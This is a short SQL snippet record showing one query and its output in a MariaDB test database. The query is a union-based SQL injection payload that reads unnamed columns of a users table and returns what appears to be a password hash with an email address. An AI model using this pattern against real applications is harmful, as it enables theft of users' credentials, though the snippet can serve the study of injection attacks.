---
id: b4d855fc-0118-4bf1-a83c-9e4e8010160c
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.433060+00:00'
updated_at: '2023-04-06T03:56:34.433060+00:00'
---

# Code Snippet b4d855fc

**Language**: SQL

```sql
MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```


